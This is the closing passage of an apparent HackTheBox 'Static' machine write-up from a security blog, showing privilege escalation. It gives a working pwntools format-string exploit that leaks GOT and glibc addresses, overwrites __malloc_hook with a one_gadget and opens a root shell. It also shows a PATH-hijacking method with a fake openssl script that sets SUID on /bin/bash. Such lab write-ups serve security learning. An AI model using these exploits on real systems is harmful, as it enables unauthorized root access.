</code></pre></div><p><strong>Task 3</strong>: The base address of the binary is likely to be <code>0x5615109d4e5b - 0x1e5b = 0x5615109d3000</code> (it will be different on every execution of the program):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">elf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> context.binary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'./ersatool'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>  
<span class="mtk1">libc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'./libc.so.6'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>

<span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.main</span>
<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Binary base address:'</span><span class="mtk1">, </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">))</span>
</code></pre></div><p>Now the process is kind of standard in Format String exploitation.</p><p><strong>Task 4</strong>: To leak an address of Glibc, we must use the Global Offset Table (GOT). This table is part of the binary and contains the addresses of the functions that can be used by the binary (namely, <code>printf</code>, <code>strncat</code>, <code>fgets</code>&mldr;).</p><p>The addresses of the GOT are known because we have their offsets and the base address of the binary. We can use the following payload to print the address of <code>printf</code> (for example) in Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'%9$s'</span><span class="mtk1">.</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.printf)</span>  
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'print-&gt;CN='</span><span class="mtk1">, </span><span class="mtk1">leak</span><span class="mtk1">)</span>
<span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
<span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1">[:</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[!] ERR'</span><span class="mtk1">)]</span>

<span class="mtk1">printf_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Address of printf():'</span><span class="mtk1">, </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">printf_addr</span><span class="mtk1">))</span>
</code></pre></div><p>Because strings in C work as pointers, if we put an address of GOT into a format string to print the content of a string, what will be printed is the address pointed by the value of the GOT address.</p><p>Notice that we are trying to leak <code>%9$s</code>, which will be the data inside address <code>printf</code> at GOT, which comes right after the format string (recall that the format string offset is <code>8</code>).</p><p>If all works correctly, we will have the real address of <code>printf</code> in Glibc.</p><p><strong>Task 5</strong>: The base address of Glibc is computed the same way as the binary base address. We only subtract the offset from the real address. In addition, we need to verify that the base address ends in <code>000</code> hexadecimal digits.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">libc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">printf_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">libc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.printf</span>  
<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Glibc base address:'</span><span class="mtk1">, </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">libc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">))</span>
</code></pre></div><p><strong>Task 6</strong>: Now we need to write to an address in memory. The best way to gain code execution in this type of situations is overriding the address of <code>__malloc_hook</code> inside Glibc to execute a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell.</p><p>Gadgets are just lines of assembly code that perform a certain operation. They are useful in Buffer Overflow exploitation using Return Oriented Programming (ROP) to bypass NX (also known as DEP).</p><p>This time, we can search for a gadget that executes <code>/bin/sh</code>. They are commonly found inside Glibc. Using <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> we can get some potential gadgets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">libc.so.6</span>
<span class="rb-purple">0x4f2c5</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>, environ)
<span class="rb-red">constraints</span>:
  <span class="rb-dark-green">rsp</span> & <span class="rb-purple">0xf</span> == 0
  <span class="rb-dark-green">rcx</span> == NULL

<span class="rb-purple">0x4f322</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>, environ)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x40</span>] == NULL

<span class="rb-purple">0x10a38c</span> execve("/bin/sh", <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x70</span>, environ)  
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x70</span>] == NULL
</code></pre></div><p>We can use <code>0x4f322</code>, for example. Now we can easily overwrite <code>__malloc_hook</code> using <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> (they provide a magic function called <code>fmtstr_payload</code> that does all the work, specifying the offset, the address and the value to write):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">one_gadget_shell</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">libc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4f322</span>

<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fmtstr_payload</span><span class="mtk1">(</span>
<span class="mtk1">    offset,</span>
<span class="mtk1">    {</span><span class="mtk1">libc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__malloc_hook: </span><span class="mtk1">one_gadget_shell</span><span class="mtk1">},</span>  
<span class="mtk1">    </span><span class="mtk9 mtki">write_size</span><span class="mtk5">=</span><span class="mtk4">'short'</span>
<span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'print-&gt;CN='</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
</code></pre></div><p><strong>Task 7</strong>: The need to overwrite <code>__malloc_hook</code> is because now we are going to send <code>%10000$c</code>. This task will require some memory space, so the binary will call <code>malloc</code>. However, <code>__malloc_hook</code> will be executed before. Since it has been modified, instead of calling <code>malloc</code>, the program will spawn a shell (<code>/bin/sh</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'print-&gt;CN='</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'%10000$c'</span><span class="mtk1">)</span>  
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Finally, we can execute the exploit and get a shell as <code>root</code> (due to the capabilities set on the binary):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1234: Done  
Offset: 8
51 0x558d4b23fe5b
Address of main(): 0x558d4b23fe5b
Binary base address: 0x558d4b23e000
GOT printf(): 0x558d4b243058
Address of printf(): 0x7f33d1794e80
Glibc base address: 0x7f33d1730000
Address of __malloc_hook(): 0x7f33d1b1bc30
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> whoami
root
<span class="code-red">$</span> cat /root/root.txt
b3298f99ac5999202090829ed5fa9fb6
</code></pre></div><p>The full exploit can be found here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static/exploit.py"><code>exploit.py</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Static#exploitpy">here</a>).</p><h3 id="privilege-escalation-alternative">Privilege escalation alternative</h3><p>Despite Format String exploitation is much cooler, there is an easier and faster way to escalate privileges. The idea is that <code>ersatool</code> can create <code>.ovpn</code> files. Maybe it is using some other binary behind the scenes.</p><p>To check all the processes running when creating a <code>.ovpn</code> file, one could use <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a>. After that, we see that the binary is using <code>openssl</code>.</p><p>But, the nuance is that the progam is called as a relative path. Hence, the binary is vulnerable to <code>PATH</code> hijacking. We can create a malicious <code>openssl</code> executable inside <code>/tmp</code> and then add <code>/tmp</code> to the <code>PATH</code> environment variable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/tmp$ echo -e '#!/bin/bash\nchmod 4755 /bin/bash' &gt; openssl  
www-data@pki:/tmp$ cat openssl
#!/bin/bash
chmod 4755 /bin/bash
www-data@pki:/tmp$ chmod +x openssl
www-data@pki:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@pki:/tmp$ which openssl
/usr/bin/openssl
www-data@pki:/tmp$ export PATH=/tmp:$PATH
www-data@pki:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@pki:/tmp$ which openssl
/tmp/openssl
www-data@pki:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
</code></pre></div><p>The malicious <code>openssl</code> will add the SUID bit to <code>/bin/bash</code>. If we use <code>ersatool create</code>, the malicious <code>openssl</code> will be executed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/tmp$ ersatool create xD
...
www-data@pki:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash  
</code></pre></div><p>And we gain access as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@pki:/tmp$ bash -p
bash-4.4# cat /root/root.txt
b3298f99ac5999202090829ed5fa9fb6  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#patching-a-gzip-file">Patching a Gzip file</a></li><li><a href="#handling-2fa">Handling 2FA</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#connection-to-static-vpn">Connection to Static VPN</a></li><li><a href="#exploiting-an-internal-server">Exploiting an internal server</a></li></ul></li><li><a href="#network-enumeration">Network enumeration</a></li><li><a href="#exploiting-another-internal-server">Exploiting another internal server</a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#finding-a-format-string-vulnerability">Finding a Format String vulnerability</a></li><li><a href="#network-setup-for-exploitation">Network setup for exploitation</a></li><li><a href="#format-string-exploitation">Format String exploitation</a></li><li><a href="#privilege-escalation-alternative">Privilege escalation alternative</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>